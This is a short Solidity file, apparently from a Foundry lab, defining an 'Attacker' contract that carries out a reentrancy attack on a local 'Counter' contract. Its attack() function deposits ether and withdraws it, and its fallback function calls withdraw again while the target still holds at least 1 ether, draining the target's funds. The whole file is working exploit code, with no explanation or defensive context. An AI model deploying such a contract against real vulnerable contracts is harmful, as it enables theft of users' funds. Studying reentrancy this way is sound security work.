// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";
import {Counter} from "./Counter.sol";

contract Attacker {
    Counter public counter;

    constructor(address _contractAddress) {
        counter = Counter(_contractAddress);
    }

    fallback() external payable {
        if (address(counter).balance >= 1 ether) {
            counter.withdraw(1 ether);
        }
    }
  
   function attack() external payable {
        counter.deposit{value: msg.value}();
        counter.withdraw(1 ether);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

}
